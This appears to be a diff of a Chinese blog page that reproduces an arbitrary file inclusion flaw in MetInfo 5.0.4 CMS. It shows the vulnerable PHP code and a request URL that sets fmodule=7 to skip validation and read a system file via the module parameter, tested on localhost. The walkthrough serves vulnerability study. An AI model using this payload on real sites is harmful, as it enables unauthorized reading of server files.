@@ -56,33 +56,17 @@
     </div>
   </header>
   <div class="article-content">
-    
-# Metinfo5.0.4任意文件包含漏洞复现
-
-MetInfo 是一个专业的企业级CMS建站系统，采用php+ Mysql架构,它5.0.4 版本存文件包含漏洞,该漏洞只能通过白盒测试去发现
-
-1.用Seay源代码审计系统发现在 /about/index.php 文件中，包含了 /include/module.php和$moudle变量
-
+    <h1 id="Metinfo5-0-4任意文件包含漏洞复现"><a href="#Metinfo5-0-4任意文件包含漏洞复现" class="headerlink" title="Metinfo5.0.4任意文件包含漏洞复现"></a>Metinfo5.0.4任意文件包含漏洞复现</h1><p>MetInfo 是一个专业的企业级CMS建站系统，采用php+ Mysql架构,它5.0.4 版本存文件包含漏洞,该漏洞只能通过白盒测试去发现</p>
+<p>1.用Seay源代码审计系统发现在 &#x2F;about&#x2F;index.php 文件中，包含了 &#x2F;include&#x2F;module.php和$moudle变量</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;../include/module.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="variable">$module</span>;</span><br></pre></td></tr></table></figure>
 
-2.定位到module.php里，发现还包含着common.inc.php，先对module.php进行代码审计，发现module.php 中存在如下代码逻辑：
-
+<p>2.定位到module.php里，发现还包含着common.inc.php，先对module.php进行代码审计，发现module.php 中存在如下代码逻辑：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$fmodule</span>!=<span class="number">7</span>)&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">100</span>)<span class="variable">$mdle</span>=<span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">101</span>)<span class="variable">$mdle</span>=<span class="number">5</span>;</span><br><span class="line">  <span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$module</span>==<span class="literal">NULL</span>)&#123;<span class="title function_ invoke__">okinfo</span>(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();&#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">2</span>||<span class="variable">$mdle</span>==<span class="number">3</span>||<span class="variable">$mdle</span>==<span class="number">4</span>||<span class="variable">$mdle</span>==<span class="number">5</span>||<span class="variable">$mdle</span>==<span class="number">6</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$fmodule</span>==<span class="variable">$mdle</span>)&#123;</span><br><span class="line">      <span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="title function_ invoke__">okinfo</span>(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$list</span>)&#123;</span><br><span class="line">      <span class="title function_ invoke__">okinfo</span>(<span class="string">&#x27;../404.html&#x27;</span>);<span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$module</span> = <span class="variable">$modulefname</span>[<span class="variable">$mdle</span>][<span class="variable">$mdtp</span>];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$mdle</span>==<span class="number">8</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$id</span>)<span class="variable">$id</span>=<span class="variable">$class1</span>;</span><br><span class="line">    <span class="variable">$module</span> = <span class="string">&#x27;../feedback/index.php&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-可以看到当fmodule这个变量不等于7时，它就会对$module进行验证，因此让fmodule=7，绕过验证
-
-4.直接访问漏洞点http://127.0.0.1/metinfo5.0.4/about/index.php
-
-5.提交fmodule和module参数用绝对路径访问敏感文件，http://127.0.0.1/metinfo5.0.4/about/index.php?fmodule=7&module=C:/Windows/System32/drivers/etc/hosts：
-
-![image-20251106013659523](C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251106013659523.png)
-
-
-
-
-
-
-
+<p>可以看到当fmodule这个变量不等于7时，它就会对$module进行验证，因此让fmodule&#x3D;7，绕过验证</p>
+<p>4.直接访问漏洞点<a target="_blank" rel="noopener" href="http://127.0.0.1/metinfo5.0.4/about/index.php">http://127.0.0.1/metinfo5.0.4/about/index.php</a></p>
+<p>5.提交fmodule和module参数用绝对路径访问敏感文件，<a target="_blank" rel="noopener" href="http://127.0.0.1/metinfo5.0.4/about/index.php?fmodule=7&module=C:/Windows/System32/drivers/etc/hosts%EF%BC%9A">http://127.0.0.1/metinfo5.0.4/about/index.php?fmodule=7&amp;module=C:/Windows/System32/drivers/etc/hosts：</a></p>
+<p><img src="C:\Users\23214\AppData\Roaming\Typora\typora-user-images\image-20251106013659523.png" alt="image-20251106013659523"></p>
 
   </div>
 </article>
